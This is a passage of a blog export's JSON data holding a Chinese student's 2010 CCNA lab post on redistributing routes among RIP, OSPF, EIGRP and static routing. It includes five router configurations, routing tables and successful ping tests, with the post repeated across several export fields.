OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />D EX 1.0.0.0/8 [170/2588160] via 192.168.3.1, 00:17:03, Ethernet1/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 [1/0] via 192.168.4.2<br />C&#160;&#160;&#160; 192.168.4.0/24 is directly connected, Ethernet1/1<br />D EX 192.168.1.0/24 [170/2588160] via 192.168.3.1, 00:17:03, Ethernet1/0<br />D EX 192.168.2.0/24 [170/2588160] via 192.168.3.1, 00:17:03, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.3.0/24 is directly connected, Ethernet1/0<br /><br /><br />R5:<br /><br />R5#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 [1/0] via 192.168.4.1<br />2.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 is directly connected, Lo\nopback0<br />C&#160;&#160;&#160; 192.168.4.0/24 is directly connected, FastEthernet0/0<br />S&#160;&#160;&#160; 192.168.1.0/24 [1/0] via 192.168.4.1<br />S&#160;&#160;&#160; 192.168.2.0/24 [1/0] via 192.168.4.1<br />S&#160;&#160;&#160; 192.168.3.0/24 [1/0] via 192.168.4.1<br /><br /><br /><br /><br />测试结果：<br /><br /><br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 8/36/64 ms<br />R1#ping 192.168.2.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.2.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 8/20/32 ms<br />R1#ping 192.168.3.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.3.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 12/32/60 ms<br />R1#ping 192.168.4.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.4.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 4/38/64 ms<br /><br />成功！！！！<br /><br /><br /><br />","source":"_posts/OSPF、EIGRP、RIP、静态路由的重分布实验.md","raw":"title: OSPF、EIGRP、RIP、静态路由的重分布实验\ncategories: [网络工程]\ntags: []\ndate: 2010-03-22 20:43:00\n---\n快毕业了，该复习了。今天没事无聊，开了这个博客，写点东西吧。<br /><br />网路拓扑图如下：<br /><br /><img src=\"/images/pic/96e6d3efba3d601162d09fc5.jpg\" small=\"0\" /><br /><br />因为是用工大瑞普模拟器做的CCNA路由版，就这么多路由器。主要是熟悉命令。<br /><br />路由器配置如下（为了空间问题，显示主要的）：<br />R1：<br /><br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Ethernet1/0<br />ip address 192.168.1.1 255.255.255.0<br />!<br />interface Ethernet1/1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router rip<br />network 1.0.0.0<br />network 192.168.1.0<br />!<br /><br />R2：<br /><br />interface FastEthernet0/0<br />ip address 192.168.1.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0/1<br />ip address 192.168.2.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute rip subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br />router rip<br />redistribute ospf 1<br />network 192.168.1.0<br />default-metric 2<br />!<br /><br />R3：<br /><br />interface Ethernet1/0<br />ip address 192.168.2.2 255.255.255.0<br />!<br />interface Ethernet1/1<br />ip address 192.168.3.1 255.255.255.0<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute ospf 1<br />network 192.168.3.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute eigrp 1 subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br /><br />R4:<br /><br />interface Ethernet1/0<br />ip address 192.168.3.2 255.255.255.0<br />!<br />interface Ethernet1/1<br />ip address 192.168.4.1 255.255.255.0<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute static<br />network 192.168.3.0<br />network 192.168.4.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.4.2<br />no ip http server<br />!<br /><br />R5:<br /><br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface FastEthernet0/0<br />ip address 192.168.4.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0/1<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.2.0 255.255.255.0 192.168.4.1<br />ip route 192.168.3.0 255.255.255.0 192.168.4.1<br />no ip http server<br />!<br /><br />路由表情况。<br /><br />R1:<br />R1#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 is directly connected, Loopback0<br />R&#160;&#160;&#160; 2.0.0.0/8 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br />R&#160;&#160;&#160; 192.168.4.0/24 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, Ethernet1/0<br />R&#160;&#160;&#160; 192.168.2.0/24 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br />R&#160;&#160;&#160; 192.168.3.0/24 [120/2] via 192.168.1.2, 00:00:15, Ethernet1/0<br /><br />R2：<br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />R&#160;&#160;&#160; 1.0.0.0/8 [120/1] via 192.168.1.1, 00:00:15, FastEthernet0/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />O E2&#160;&#160;&#160; 2.2.2.0 [110/20] via 192.168.2.2, 00:22:20, FastEthernet0/1<br />O E2 192.168.4.0/24 [110/20] via 192.168.2.2, 00:22:20, FastEthernet0/1<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, FastEthernet0/0<br />C&#160;&#160;&#160; 192.168.2.0/24 is directly connected, FastEthernet0/1<br />O E2 192.168.3.0/24 [110/20] via 192.168.2.2, 00:22:20, FastEthernet0/1<br /><br />R3:<br /><br /><br />R3#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />O E2 1.0.0.0/8 [110/20] via 192.168.2.1, 00:21:47, Ethernet1/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />D EX&#160;&#160;&#160; 2.2.2.0 [170/2588160] via 192.168.3.2, 00:32:31, Ethernet1/1<br />D&#160;&#160;&#160; 192.168.4.0/24 [90/307200] via 192.168.3.2, 00:32:31, Ethernet1/1<br />O E2 192.168.1.0/24 [110/20] via 192.168.2.1, 00:21:47, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.2.0/24 is directly connected, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.3.0/24 is directly connected, Ethernet1/1<br /><br /><br />R4:<br /><br />R4#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />D EX 1.0.0.0/8 [170/2588160] via 192.168.3.1, 00:17:03, Ethernet1/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 [1/0] via 192.168.4.2<br />C&#160;&#160;&#160; 192.168.4.0/24 is directly connected, Ethernet1/1<br />D EX 192.168.1.0/24 [170/2588160] via 192.168.3.1, 00:17:03, Ethernet1/0<br />D EX 192.168.2.0/24 [170/2588160] via 192.168.3.1, 00:17:03, Ethernet1/0<br />C&#160;&#160;&#160; 192.168.3.0/24 is directly connected, Ethernet1/0<br /><br /><br />R5:<br /><br />R5#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 [1/0] via 192.168.4.1<br />2.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 is directly connected, Lo\nopback0<br />C&#160;&#160;&#160; 192.168.4.0/24 is directly connected, FastEthernet0/0<br />S&#160;&#160;&#160; 192.168.1.0/24 [1/0] via 192.168.4.1<br />S&#160;&#160;&#160; 192.168.2.0/24 [1/0] via 192.168.4.1<br />S&#160;&#160;&#160; 192.168.3.0/24 [1/0] via 192.168.4.1<br /><br /><br /><br /><br />测试结果：<br /><br /><br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 8/36/64 ms<br />R1#ping 192.168.2.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.2.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 8/20/32 ms<br />R1#ping 192.168.3.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.3.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 12/32/60 ms<br />R1#ping 192.168.4.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.4.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 4/38/64 ms<br /><br />成功！！！！<br /><br /><br /><br />","slug":"OSPF、EIGRP、RIP、静态路由的重分布实验","published":1,"updated":"2023-04-22T05:38:44.678Z","_id":"clgrjlxim005l7opieo5n0xjo","comments":1,"layout":"post","photos":[],"link":"","content":"<p>快毕业了，该复习了。今天没事无聊，开了这个博客，写点东西吧。<br /><br />网路拓扑图如下：<br /><br /><img src=\"/images/pic/96e6d3efba3d601162d09fc5.jpg\" small=\"0\" /><br /><br />因为是用工大瑞普模拟器做的CCNA路由版，就这么多路由器。主要是熟悉命令。<br /><br />路由器配置如下（为了空间问题，显示主要的）：<br />R1：<br /><br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;0<br />ip address 192.168.1.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router rip<br />network 1.0.0.0<br />network 192.168.1.0<br />!<br /><br />R2：<br /><br />interface FastEthernet0&#x2F;0<br />ip address 192.168.1.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0&#x2F;1<br />ip address 192.168.2.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute rip subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br />router rip<br />redistribute ospf 1<br />network 192.168.1.0<br />default-metric 2<br />!<br /><br />R3：<br /><br />interface Ethernet1&#x2F;0<br />ip address 192.168.2.2 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />ip address 192.168.3.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute ospf 1<br />network 192.168.3.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute eigrp 1 subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br /><br />R4:<br /><br />interface Ethernet1&#x2F;0<br />ip address 192.168.3.2 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />ip address 192.168.4.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute static<br />network 192.168.3.0<br />network 192.168.4.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.4.2<br />no ip http server<br />!<br /><br />R5:<br /><br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface FastEthernet0&#x2F;0<br />ip address 192.168.4.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0&#x2F;1<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.2.0 255.255.255.0 192.168.4.1<br />ip route 192.168.3.0 255.255.255.0 192.168.4.1<br />no ip http server<br />!<br /><br />路由表情况。<br /><br />R1:<br />R1#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 is directly connected, Loopback0<br />R&amp;#160;&amp;#160;&amp;#160; 2.0.0.0&#x2F;8 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br />R&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br />R&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br />R&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br /><br />R2：<br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />R&amp;#160;&amp;#160;&amp;#160; 1.0.0.0&#x2F;8 [120&#x2F;1] via 192.168.1.1, 00:00:15, FastEthernet0&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />O E2&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [110&#x2F;20] via 192.168.2.2, 00:22:20, FastEthernet0&#x2F;1<br />O E2 192.168.4.0&#x2F;24 [110&#x2F;20] via 192.168.2.2, 00:22:20, FastEthernet0&#x2F;1<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, FastEthernet0&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 is directly connected, FastEthernet0&#x2F;1<br />O E2 192.168.3.0&#x2F;24 [110&#x2F;20] via 192.168.2.2, 00:22:20, FastEthernet0&#x2F;1<br /><br />R3:<br /><br /><br />R3#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />O E2 1.0.0.0&#x2F;8 [110&#x2F;20] via 192.168.2.1, 00:21:47, Ethernet1&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />D EX&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [170&#x2F;2588160] via 192.168.3.2, 00:32:31, Ethernet1&#x2F;1<br />D&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 [90&#x2F;307200] via 192.168.3.2, 00:32:31, Ethernet1&#x2F;1<br />O E2 192.168.1.0&#x2F;24 [110&#x2F;20] via 192.168.2.1, 00:21:47, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br /><br /><br />R4:<br /><br />R4#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />D EX 1.0.0.0&#x2F;8 [170&#x2F;2588160] via 192.168.3.1, 00:17:03, Ethernet1&#x2F;0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [1&#x2F;0] via 192.168.4.2<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br />D EX 192.168.1.0&#x2F;24 [170&#x2F;2588160] via 192.168.3.1, 00:17:03, Ethernet1&#x2F;0<br />D EX 192.168.2.0&#x2F;24 [170&#x2F;2588160] via 192.168.3.1, 00:17:03, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br /><br /><br />R5:<br /><br />R5#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 [1&#x2F;0] via 192.168.4.1<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 is directly connected, Lo<br>opback0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 is directly connected, FastEthernet0&#x2F;0<br />S&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 [1&#x2F;0] via 192.168.4.1<br />S&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 [1&#x2F;0] via 192.168.4.1<br />S&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 [1&#x2F;0] via 192.168.4.1<br /><br /><br /><br /><br />测试结果：<br /><br /><br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 8&#x2F;36&#x2F;64 ms<br />R1#ping 192.168.2.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.2.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 8&#x2F;20&#x2F;32 ms<br />R1#ping 192.168.3.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.3.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 12&#x2F;32&#x2F;60 ms<br />R1#ping 192.168.4.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 192.168.4.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 4&#x2F;38&#x2F;64 ms<br /><br />成功！！！！<br /><br /><br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>快毕业了，该复习了。今天没事无聊，开了这个博客，写点东西吧。<br /><br />网路拓扑图如下：<br /><br /><img src=\"/images/pic/96e6d3efba3d601162d09fc5.jpg\" small=\"0\" /><br /><br />因为是用工大瑞普模拟器做的CCNA路由版，就这么多路由器。主要是熟悉命令。<br /><br />路由器配置如下（为了空间问题，显示主要的）：<br />R1：<br /><br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;0<br />ip address 192.168.1.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router rip<br />network 1.0.0.0<br />network 192.168.1.0<br />!<br /><br />R2：<br /><br />interface FastEthernet0&#x2F;0<br />ip address 192.168.1.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0&#x2F;1<br />ip address 192.168.2.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute rip subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br />router rip<br />redistribute ospf 1<br />network 192.168.1.0<br />default-metric 2<br />!<br /><br />R3：<br /><br />interface Ethernet1&#x2F;0<br />ip address 192.168.2.2 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />ip address 192.168.3.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute ospf 1<br />network 192.168.3.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute eigrp 1 subnets<br />network 192.168.2.0 0.0.0.255 area 0<br />!<br /><br />R4:<br /><br />interface Ethernet1&#x2F;0<br />ip address 192.168.3.2 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />ip address 192.168.4.1 255.255.255.0<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router eigrp 1<br />redistribute static<br />network 192.168.3.0<br />network 192.168.4.0<br />default-metric 1000 10 1 255 1500<br />no eigrp log-neighbor-changes<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.4.2<br />no ip http server<br />!<br /><br />R5:<br /><br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface FastEthernet0&#x2F;0<br />ip address 192.168.4.2 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0&#x2F;1<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.1.0 255.255.255.0 192.168.4.1<br />ip route 192.168.2.0 255.255.255.0 192.168.4.1<br />ip route 192.168.3.0 255.255.255.0 192.168.4.1<br />no ip http server<br />!<br /><br />路由表情况。<br /><br />R1:<br />R1#SH IP ROute<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 is directly connected, Loopback0<br />R&amp;#160;&amp;#160;&amp;#160; 2.0.0.0&#x2F;8 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br />R&amp;#160;&amp;#160;&amp;#160; 192.168.4.0&#x2F;24 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br />R&amp;#160;&amp;#160;&amp;#160; 192.168.2.0&#x2F;24 [120&#x2F;2] via 192.168.1.2, 00:00:15, Ethernet1&#x2F;0<br />R&amp;#160;&amp;#160;&amp;#160; 192.168.3.0&#x2F;24 